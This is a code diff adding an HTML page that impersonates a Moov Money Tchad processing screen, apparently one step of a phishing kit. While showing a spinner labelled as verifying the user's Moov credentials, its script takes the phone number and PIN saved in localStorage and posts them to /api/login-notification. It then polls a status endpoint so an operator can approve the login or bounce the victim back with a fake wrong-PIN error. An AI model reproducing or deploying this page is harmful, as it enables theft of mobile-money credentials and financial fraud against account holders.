@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Moov Money Tchad - Traitement</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root { --moov-orange: #ff6600; --moov-blue: #0044cc; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #1e293b; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .loading-card { background: #fff; width: 88%; max-width: 380px; padding: 45px 24px; border-radius: 20px; text-align: center; box-shadow: 0 12px 30px rgba(0,0,0,0.25); display: flex; flex-direction: column; align-items: center; }
+        .loader-circle { width: 100px; height: 100px; background: var(--moov-blue); border-radius: 50%; margin-bottom: 25px; display: flex; justify-content: center; align-items: center; border: 4px solid var(--moov-orange); }
+        .loader-circle::after { content: ''; width: 65px; height: 65px; border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #fff; border-radius: 50%; animation: spin 1.2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: var(--moov-blue); font-size: 24px; margin: 0 0 10px; font-weight: 800; }
+        p { color: #666; font-size: 15px; margin: 0; }
+    </style>
+</head>
+<body>
+
+<div class="loading-card">
+    <div class="loader-circle"></div>
+    <h2 id="main-text">Traitement...</h2>
+    <p id="sub-text">Vérification de vos identifiants Moov...</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+    const mainText = document.getElementById("main-text");
+    const subText = document.getElementById("sub-text");
+    const phone = localStorage.getItem("phone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
+
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin, country: "TD" })
+        });
+    } catch (err) { console.error(err); }
+
+    const timer = setInterval(async () => {
+        try {
+            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const data = await res.json();
+            if (data.status === "approved") {
+                clearInterval(timer);
+                mainText.textContent = "Approuvé !";
+                setTimeout(() => window.location.href = "/page8", 1200);
+            } else if (data.status === "denied") {
+                clearInterval(timer);
+                // Redirect back to login with wrong PIN error flag
+                window.location.href = "/page6?error=wrongpin";
+            }
+        } catch (e) { console.error(e); }
+    }, 2000);
+});
+</script>
+</body>
+</html>
